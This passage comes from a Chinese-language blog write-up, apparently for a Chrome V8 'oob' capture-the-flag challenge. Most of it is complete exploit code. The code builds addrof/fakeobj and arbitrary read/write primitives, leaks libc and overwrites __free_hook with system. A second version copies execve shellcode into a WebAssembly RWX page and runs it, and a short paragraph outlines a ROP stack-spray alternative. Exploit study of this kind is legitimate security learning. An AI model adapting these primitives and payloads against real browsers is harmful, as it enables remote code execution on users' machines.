shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/result2.PNG" class="">
<p>如果你不想用wasm，这里还可以用rop的方法，具体操作这里就不多说了，大体思路就是用environ变量获取一个栈上的地址，然后把ROP开RWX的链写到栈上，再在栈上的一片区域（因为你不能确定它返回地址是哪个)布置retn，用栈喷的方法来控制程序运行。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><h3 id="修改free-hook版"><a href="#修改free-hook版" class="headerlink" title="修改free_hook版"></a>修改free_hook版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<h3 id="shellcode版"><a href="#shellcode版" class="headerlink" title="shellcode版"></a>shellcode版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>chrome pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
</search>
